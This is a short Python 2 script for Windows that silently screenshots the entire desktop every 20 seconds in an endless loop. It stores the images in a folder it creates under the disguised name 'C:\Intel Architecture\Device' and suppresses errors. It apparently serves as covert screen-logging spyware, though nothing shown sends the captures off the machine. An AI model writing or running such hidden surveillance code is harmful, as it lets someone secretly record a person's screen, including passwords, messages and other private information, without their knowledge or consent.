import win32gui, win32ui, win32con, win32api, pythoncom, win32clipboard, time, os
from ctypes import *
from datetime import datetime

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi
waitTime=20

def screen(saveFile):
    try:
        hdesktop=win32gui.GetDesktopWindow()
        width=win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height=win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left=win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top=win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        desktop_dc=win32gui.GetWindowDC(hdesktop)
        img_dc=win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc=img_dc.CreateCompatibleDC()
        screenshot=win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width,height), img_dc, (left, top), win32con.SRCCOPY)
        screenshot.SaveBitmapFile(mem_dc, saveFile)
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())
    except Exception, e:
        print e
        pass

def main():
    try:
        os.system("mkdir \"C:\\Intel Architecture\"")
        os.system("mkdir \"C:\\Intel Architecture\\Device\"")
        while(1):
            saveFile="C:\\Intel Architecture\\Device\\"+str(datetime.today().year)+"-"+str(datetime.today().month)+"-"+str(datetime.today().day)+"-"+str(datetime.today().hour)+"-"+str(datetime.today().minute)+"-"+str(datetime.today().second)+".png"
            screen(saveFile)
            time.sleep(waitTime)
    except Exception, e:
        exit(0)
        
if __name__=="__main__":
    main()
